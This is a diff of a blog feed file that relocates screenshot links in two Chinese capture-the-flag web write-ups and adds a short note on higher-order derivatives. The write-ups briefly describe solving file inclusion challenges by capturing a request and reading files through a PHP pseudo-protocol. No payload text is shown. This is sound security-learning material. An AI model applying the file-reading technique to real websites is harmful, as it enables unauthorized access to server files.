 <h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>伪协议</p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921195808239.png" alt="image-20220921195808239"></p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921195824894.png" alt="image-20220921195824894"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921195808239.png" alt="image-20220921195808239"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921195824894.png" alt="image-20220921195824894"></p>
 <h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>控制台找到一个跳转链接点击跳转</p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921203326139.png" alt="image-20220921203326139"></p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921203422321.png" alt="image-20220921203422321"></p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921203606516.png" alt="image-20220921203606516"></p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921203457987.png" alt="image-20220921203457987"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921203326139.png" alt="image-20220921203326139"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921203422321.png" alt="image-20220921203422321"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921203606516.png" alt="image-20220921203606516"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921203457987.png" alt="image-20220921203457987"></p>
 <p>中间访问的action.php抓包得到</p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921202047426.png" alt="image-20220921202047426"></p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921202140213.png" alt="image-20220921202140213"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921202047426.png" alt="image-20220921202047426"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921202140213.png" alt="image-20220921202140213"></p>
 <p>stristr(str1,str2)查找str2在str1中第一次出现，并返回剩余部分</p>
 <p>strstr一样但是大小写敏感</p>
 <p>访问</p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921202747248.png" alt="image-20220921202747248"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921202747248.png" alt="image-20220921202747248"></p>
 <p>伪协议读文件</p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921203216906.png" alt="image-20220921203216906"></p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921203231337.png" alt="image-20220921203231337"></p>
-<p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921210946904.png" alt="image-20220921210946904"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921203216906.png" alt="image-20220921203216906"></p>
+<p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921203231337.png" alt="image-20220921203231337"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>“高阶导数”</title>
+    <url>/2020/11/19/%E9%AB%98%E9%98%B6%E5%AF%BC%E6%95%B0/</url>
+    <content><![CDATA[<p>没好好学习高数结果连个高阶导数都不会</p>
+<p>方法一：递归，找规律，一般是有手就行</p>
+<p>方法二：要记两个莱布尼茨公式</p>
 ]]></content>
   </entry>
   <entry>
